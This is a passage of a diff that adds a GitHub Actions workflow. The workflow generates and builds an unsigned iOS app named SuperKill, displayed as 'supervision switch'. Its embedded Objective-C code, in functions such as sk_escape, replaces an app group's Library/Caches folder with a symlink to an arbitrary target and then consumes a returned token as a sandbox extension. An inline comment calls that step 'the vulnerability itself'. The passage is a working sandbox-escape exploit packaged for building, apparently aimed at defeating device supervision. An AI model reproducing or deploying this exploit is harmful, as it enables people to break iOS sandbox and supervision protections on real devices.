+
+              void *query = create();
+              if (!query) {
+                  if (image) dlclose(image);
+                  return -3;
+              }
+
+              set_class(query, SK_CQ_CLASS_APP_GROUP);
+              xpc_object_t identifiers = sk_make_identifiers(group, array_ids);
+              set_ids(query, identifiers);
+              set_part(query, SK_CQ_PART_LIBRARY_CACHES);
+              set_flags(query, flags);
+
+              // 把 Library/Caches 换成指向目标的符号链接——这一步是漏洞本体。
+              [fm removeItemAtPath:caches error:NULL];
+              if (![fm createSymbolicLinkAtPath:caches withDestinationPath:target error:NULL]) {
+                  free_query(query);
+                  if (image) dlclose(image);
+                  return -4;
+              }
+
+              int64_t result_code = 0;
+              void *result = get_single(query);
+              if (!result) {
+                  result_code = -5;
+              } else {
+                  char *token = copy_token(result);
+                  if (!token) {
+                      result_code = -6;
+                  } else {
+                      int64_t handle = consume(token);
+                      free(token);
+                      result_code = (handle > 0) ? handle : -6;
+                  }
+              }
+
+              free_query(query);
+              sk_cleanup_symlink(group);
+              if (image) dlclose(image);
+              return result_code;
+          }
+
+          int64_t sk_escape(NSString *target, NSString *group, bool create_dir, int64_t *flags_used) {
+              if (target.length == 0 || group.length == 0) return -1;
+              if (!sk_has_app_group(group)) return -1;
+
+              const uint64_t flags_order[2] = { SK_CQ_FLAGS_DEFAULT, SK_CQ_FLAGS_IOS26_APPGROUP };
+              int64_t last = -2;
+
+              for (int f = 0; f < 2; f++) {
+                  for (int a = 0; a < 2; a++) {
+                      int64_t handle = sk_escape_once(target, group, flags_order[f], create_dir, a == 1);
+                      if (handle > 0) {
+                          if (flags_used) *flags_used = (int64_t)flags_order[f];
+                          return handle;
+                      }
+                      last = handle;
+                      // 这些错误换参数也没意义，直接回。
+                      if (handle == -255 || handle == -1 || handle == -2 ||
+                          handle == -3 || handle == -4) {
+                          return handle;
+                      }
+                  }
+              }
+              return last;
+          }
+
+          void sk_escape_release(int64_t handle) {
+              if (handle <= 0) return;
+              sbx_release_fn release_ext = (sbx_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
+              if (release_ext) release_ext(handle);
+          }
+          SK_EOF_08_WORSE_QUERY_M
+          mkdir -p Resources
+          cat > Resources/Info.plist <<'SK_EOF_09_INFO_PLIST'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+          <plist version="1.0">
+          <dict>
+          	<key>CFBundleDevelopmentRegion</key>
+          	<string>zh_CN</string>
+          	<key>CFBundleDisplayName</key>
+          	<string>监管开关</string>
+          	<key>CFBundleExecutable</key>
+          	<string>$(EXECUTABLE_NAME)</string>
+          	<key>CFBundleIdentifier</key>
+          	<string>$(PRODUCT_BUNDLE_IDENTIFIER)</string>
+          	<key>CFBundleInfoDictionaryVersion</key>
+          	<string>6.0</string>
+          	<key>CFBundleName</key>
+          	<string>$(PRODUCT_NAME)</string>
+          	<key>CFBundlePackageType</key>
+          	<string>APPL</string>
+          	<key>CFBundleShortVersionString</key>
+          	<string>1.0</string>
+          	<key>CFBundleVersion</key>
+          	<string>1</string>
+          	<key>LSRequiresIPhoneOS</key>
+          	<true/>
+          	<key>LSSupportsOpeningDocumentsInPlace</key>
+          	<true/>
+          	<key>MinimumOSVersion</key>
+          	<string>17.0</string>
+          	<key>SKAppGroup</key>
+          	<string>$(SK_APP_GROUP)</string>
+          	<key>UIApplicationSupportsIndirectInputEvents</key>
+          	<true/>
+          	<key>UIFileSharingEnabled</key>
+          	<true/>
+          	<key>UILaunchScreen</key>
+          	<dict/>
+          	<key>UIRequiredDeviceCapabilities</key>
+          	<array>
+          		<string>arm64</string>
+          	</array>
+          	<key>UISupportedInterfaceOrientations</key>
+          	<array>
+          		<string>UIInterfaceOrientationPortrait</string>
+          	</array>
+          	<key>UIViewControllerBasedStatusBarAppearance</key>
+          	<true/>
+          </dict>
+          </plist>
+          SK_EOF_09_INFO_PLIST
+          mkdir -p Entitlements
+          cat > Entitlements/SuperKill.entitlements <<'SK_EOF_10_SUPERKILL_ENTITLEMENTS'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+          <plist version="1.0">
+          <dict>
+          	<!-- 必须替换成你在开发者门户注册、并已勾进描述文件的 App Group -->
+          	<key>com.apple.security.application-groups</key>
+          	<array>
+          		<string>group.cc.replace.superkill</string>
+          	</array>
+          </dict>
+          </plist>
+          SK_EOF_10_SUPERKILL_ENTITLEMENTS
+          cat > project.yml <<'SK_EOF_11_PROJECT_YML'
+          name: SuperKill
+          options:
+            bundleIdPrefix: cc.replace
+            createIntermediateGroups: true
+            deploymentTarget:
+              iOS: "17.0"
+
+          settings:
+            base:
+              IPHONEOS_DEPLOYMENT_TARGET: "17.0"
+              CLANG_ENABLE_OBJC_ARC: YES
+              GENERATE_INFOPLIST_FILE: NO
+              SWIFT_VERSION: "5.0"
+              # 默认 App Group；出包时可用 SK_APP_GROUP=... 覆盖
+              SK_APP_GROUP: group.cc.replace.superkill
+
+          targets:
+            SuperKill:
+              type: application
+              platform: iOS
+              sources:
+                - path: Sources
+              settings:
+                base:
+                  PRODUCT_NAME: SuperKill
+                  PRODUCT_BUNDLE_IDENTIFIER: cc.replace.superkill
+                  INFOPLIST_FILE: Resources/Info.plist
+                  CODE_SIGN_ENTITLEMENTS: Entitlements/SuperKill.entitlements
+                  CODE_SIGN_STYLE: Automatic
+                  DEVELOPMENT_TEAM: ""
+                  TARGETED_DEVICE_FAMILY: "1,2"
+                  OTHER_LDFLAGS: "-framework Foundation -framework UIKit -framework Security"
+              scheme:
+                gatherCoverageData: false
+          SK_EOF_11_PROJECT_YML
+
+      - name: 安装 XcodeGen
+        run: brew install xcodegen
+
+      - name: 编译并打包（未签名）
+        run: |
+          set -euo pipefail
+          xcodegen generate --spec project.yml
+          xcodebuild -project SuperKill.xcodeproj \
+            -target SuperKill \
+            -configuration Release \
+            -sdk iphoneos \
+            CONFIGURATION_BUILD_DIR="$PWD/build/app" \
+            PRODUCT_BUNDLE_IDENTIFIER="$BUNDLE_ID" \
+            SK_APP_GROUP="$APP_GROUP" \
+            CODE_SIGNING_ALLOWED=NO \
+            CODE_SIGNING_REQUIRED=NO \
+            CODE_SIGN_IDENTITY="" \
+            build
+          mkdir -p build/out/Payload
+          cp -R build/app/SuperKill.app build/out/Payload/
+          /usr/libexec/PlistBuddy -c "Set :SKAppGroup $APP_GROUP" build/out/Payload/SuperKill.app/Info.plist || true
+          cd build/out && zip -qry SuperKill-unsigned.ipa Payload
+          ls -lh SuperKill-unsigned.ipa
+
+      - name: 上传 artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: SuperKill-unsigned-ipa
+          path: build/out/*.ipa
+          if-no-files-found: error
